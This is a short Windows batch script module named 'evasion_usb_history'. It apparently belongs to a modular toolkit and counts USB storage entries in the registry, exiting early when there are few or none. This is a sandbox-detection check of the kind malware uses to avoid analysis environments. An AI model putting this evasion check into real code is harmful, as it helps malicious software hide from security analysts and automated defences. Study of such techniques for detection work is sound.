REM provides: evasion_usb_history
REM depends: (none)
REM description: Check USB device history to detect sandbox with no peripheral history

REM Real machines accumulate USB device entries over time
set "USB_COUNT=0"
for /f %%c in ('reg query "HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR" 2^>nul ^| find /c "HKEY"') do (
    set "USB_COUNT=%%c"
)

REM No USB history at all strongly indicates sandbox
if "%USB_COUNT%"=="0" exit /b 0

REM Very few entries also suspicious
if %USB_COUNT% LEQ 2 exit /b 0
